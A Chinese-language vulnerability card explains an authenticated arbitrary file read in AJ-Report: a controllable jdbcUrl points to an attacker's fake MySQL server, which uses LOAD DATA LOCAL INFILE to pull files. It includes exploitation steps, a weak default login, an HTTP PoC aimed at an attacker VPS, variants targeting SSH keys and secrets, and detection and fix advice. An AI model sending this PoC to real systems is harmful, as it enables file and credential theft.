---
id: web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read
title: AJ-Report 数据源测试连接任意 jdbcUrl：恶意 MySQL 服务端 LOAD DATA LOCAL INFILE 读取服务端文件
type: scenario
domain: web
path: web/java/component
technique: jdbc-url-malicious-mysql-local-infile-read
aliases:
- AJ-Report 任意文件读取
- 数据源测试连接 JDBC 注入
- 恶意 MySQL 读取文件
- LOAD DATA LOCAL INFILE 利用
- allowLoadLocalInfile
- java-chains FakeMySqlReadPayload
tags:
- java
- jdbc
- mysql
- aj-report
- arbitrary-file-read
- malicious-server
- datasource
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T09:01:06+08:00'
  notes: 已对照原文与图02/04/06核对：DataSourceController.testConnection 接收 ConnectionParam{sourceType,sourceConfig}，sourceConfig 仅 @NotBlank，analysisRelationalDbConfig 解析 jdbcUrl 后交 DruidDataSource.getConnection，无 URL 校验；图02 数据源配置连接串为 jdbc:mysql://123.57.23.40:3308/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=tr...，图04 java-chains FakeMySqlReadPayload，图06 VPS fake-server-files 中 cat passwd 显示 /etc/passwd 内容，任意文件读取已打通，与卡内一致。原文未给 AJ-Report 版本号，卡内未写 affected_versions，正确。已修正卡内指向不存在卡 [[web-generic-ssrf]] 的关联为文字描述。作者跳过 JWT 硬编码（与存量卡同场景且原文未演示伪造）、JS 黑名单/Groovy/用户 SQL（均无 PoC 未验证）合理。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
---

## 一句话结论

AJ-Report 的数据源“测试连接”接口把请求体 JSON 中的 `jdbcUrl` 原样交给 Druid 建立连接；攻击者（登录后或伪造 JWT 后）把 `jdbcUrl` 指向自己的恶意 MySQL 服务端并开启 `allowLoadLocalInfile`/`allowUrlInLocalInfile`，服务端即可用 `LOAD DATA LOCAL INFILE` 让 AJ-Report 把本机文件内容回传，形成任意文件读取。

## 原理

- **入口信任了完整连接串**：`DataSourceController.testConnection` 接收 `ConnectionParam{sourceType, sourceConfig}`，`sourceConfig` 只校验非空，`analysisRelationalDbConfig` 把 JSON 中的 `jdbcUrl`、`username`、`password`、`driverName` 直接赋给 `DataSourceDto`。
- **原样交给连接池**：`jdbcService.getUnPooledConnection` 调用 `druidProperties.dataSource(url, username, password, driverClassName)` 并 `getConnection()`；没有任何 URL 白名单、主机限制或参数过滤。
- **MySQL 驱动的本地文件读取能力**：Connector/J 支持 `LOAD DATA LOCAL INFILE` 的客户端侧文件读取。默认 `allowLoadLocalInfile=false`，但攻击者在 URL 中自行添加 `allowLoadLocalInfile=true` 后即开启；`allowUrlInLocalInfile=true` 允许服务端在 LOAD DATA 语句中指定任意路径（否则受 `allowLoadLocalInfileInPath` 约束）；`maxAllowedPacket` 调大可传更大文件。
- **恶意服务端主导**：JDBC 握手完成后，攻击者控制的 MySQL 服务端发送 `LOAD DATA LOCAL INFILE '/etc/passwd'`，客户端驱动按协议读取该本地文件并发送给服务端；攻击者在服务端即可拿到内容。
- **为什么成立**：JDBC URL 是连接配置而非“数据”，服务端若允许用户完全控制 URL，就等价于允许用户控制驱动行为；MySQL 驱动为兼容性保留的 LOCAL INFILE 能力把“连数据库”变成了“读本地文件”。

## 触发条件

- 目标存在数据源管理/测试连接功能，且 `jdbcUrl` 可由请求控制（AJ-Report 的 `POST /calab-report-server/dataSource/testConnection`）。
- 攻击者具备登录态：原文使用弱口令 `admin/123456` 进入后台；结合文章发现的硬编码 JWT 密钥也可伪造令牌（该伪造步骤原文未单独演示）。
- 目标可访问攻击者控制的 MySQL 服务端（出网或同网段可达）。
- 目标使用的 MySQL Connector/J 版本支持上述 URL 参数（常见 8.x）。

## 利用步骤

1. 在 VPS 上启动恶意 MySQL 服务端（原文使用 java-chains 的 FakeMySqlReadPayload，指定要读取的 `/etc/passwd`）。
2. 登录 AJ-Report 后台，或按硬编码 JWT 密钥伪造管理员令牌。
3. 抓取“测试连接”请求，把 `sourceConfig` 中的 `jdbcUrl` 改为指向 VPS 的 MySQL 地址，并附加参数：
   `allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=<payload>`
4. 发送请求，服务端发起 JDBC 连接；恶意 MySQL 返回 LOAD DATA LOCAL INFILE 请求，驱动读取目标文件并上传到服务端。
5. 在 VPS 的接收目录（原文为 `fake-server-files`）查看并保存泄露的文件内容。

## PoC

```http
POST /calab-report-server/dataSource/testConnection HTTP/1.1
Host: <target>
Authorization: <admin-or-forged-JWT>
Content-Type: application/json;charset=UTF-8

{
  "sourceType": "mysql",
  "sourceConfig": "{\"driverName\":\"com.mysql.cj.jdbc.Driver\",\"jdbcUrl\":\"jdbc:mysql://<vps>:3308/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360&user=<java-chains-payload>\",\"username\":\"<user>\",\"password\":\"<pass>\"}"
}
```

原文验证结果：VPS 的 `fake-server-files` 目录中出现目标 `/etc/passwd` 内容，读取成功。

## 变体与关联

- 变体：读取 `/etc/shadow`（需进程权限）、应用配置文件（数据库口令、JWT 密钥）、SSH 私钥；也可换成其他支持恶意服务端文件的 JDBC 驱动/数据库（如 PostgreSQL 的 `socketFactory` 类加载、Oracle 的 JNDI 数据源等），具体取决于驱动与 URL 参数。
- 关联：`[[web-java-component-dataease-json-driver-override-jdbc-rce]]`（同类数据源功能因可控 JDBC 参数升级为 RCE）；`[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]`、`[[web-java-deser-fastjson-mysql-jdbc-autodeserialize]]`（可控 JDBC URL + 恶意 MySQL 的另一种利用：反序列化 RCE）；以及任意连接类问题的通用视角（可控 URL 的 SSRF/出站连接）。
- 与反序列化利用的区别：本场景不依赖 `autoDeserialize` 和 gadget，只用驱动内置的 LOCAL INFILE 能力，因此无 gadget 依赖、危害稳定为文件读取。

## 检测与防御

- 检测：数据源测试请求中出现 `allowLoadLocalInfile`、`allowUrlInLocalInfile`、`autoDeserialize`、`socketFactory` 等危险驱动参数；应用服务器向非业务数据库地址发起 3306/其他数据库端口连接；`testConnection` 后出现异常外连与文件读取（EDR/auditd 观察 Java 进程读取 `/etc/passwd` 等）。
- 修复：不要允许用户完全控制 `jdbcUrl`；对数据源连接做主机/端口/驱动白名单，剥离或拒绝危险 URL 参数；测试连接与业务连接使用受控的驱动配置。
- 缓解：数据源管理仅对可信管理员开放；网络层限制应用出站到非业务网段；升级驱动并显式设置 `allowLoadLocalInfile=false`（但根本上仍需服务端校验 URL）。
